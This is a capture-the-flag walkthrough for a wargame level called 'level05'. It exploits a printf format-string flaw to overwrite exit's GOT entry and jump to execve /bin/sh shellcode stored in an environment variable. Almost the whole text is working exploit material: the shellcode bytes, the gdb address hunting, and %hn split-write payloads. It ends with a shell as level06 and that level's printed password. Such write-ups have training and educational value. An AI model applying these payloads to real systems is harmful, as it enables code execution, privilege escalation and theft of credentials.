# Printf exploit, we will change GOT address of exit so we can jump to our shellcode

# We can't put our shellcode in our args because some characters will be changed at runtime
# Alpha characters will be lowered so \x50 in our shellcode will become \x70 (P -> p)

# I'll use an env variable to store my shellcode (SHELLCODE)

==================================================================================================================

# I put a NOPsland before my shellcode because the stack is not starting exactly
# At the same address (difference between real env and GDB)
# We have a chance to jump in the NOPs and continuing execution to our shellcode
env SHELLCODE=$(python -c 'print "\x90"*64+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"') gdb level05
# I unset GDB's env to be the closest to the real env
(gdb) unset env LINES
(gdb) unset env COLUMNS

# Let's find where we have to overwrite
(gdb) info func exit@plt
0x08048370  exit@plt
(gdb) x/i 0x08048370
0x8048370 <exit@plt>:	jmp    *0x80497e0
# We must overwrite 0x080497e0

# Now let's find the address we have to put in there
(gdb) x/50s *((char **)environ)
0xffffd896:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343\211\301\211°\v̀1\300@̀"
# Search where our NOPsland is starting
(gdb) x/x 0xffffd8a0
0xffffd8a0:	0x90
# We have to write 0xffffd8a0 at 0x080497e0, pretty simple right ? :)

==================================================================================================================

# Since 0xffffd8a0 is a pretty big value in decimal (4294957216), i had to print it in 2 times
(gdb) b *0x08048513
Breakpoint 1 at 0x8048513
(gdb) command 1
Type commands for breakpoint(s) 1, one per line.
End with a line saying just "end".
>x/wx 0x080497e0
>end
(gdb) r < <(python -c 'print "\xe0\x97\x04\x08"+"%x"*8+"%4294957216d"+"%hn"')
0x80497e0 <exit@got.plt>:	0x08048376
# 4294957216 is too big, no characters are print and the value is unchanged

# I had to write 0xd8a0 with %hn at 0x080497e0 then 0xffff at 0x080497e2
(gdb) r < <(python -c 'print "\xe0\x97\x04\x08"+"DEAD"+"\xe2\x97\x04\x08"+"%x"*8+"%55393x"+"%hn"+"%10079x"+"%hn"')
[...]
process 1894 is executing new program: /bin/dash

# We should be good, let's try it in a real env :)

export SHELLCODE=$(python -c 'print "\x90"*64+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
(python -c 'print "\xe0\x97\x04\x08"+"DEAD"+"\xe2\x97\x04\x08"+"%x"*8+"%55393x"+"%hn"+"%10079x"+"%hn"' ; cat ) | ./level05

whoami
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
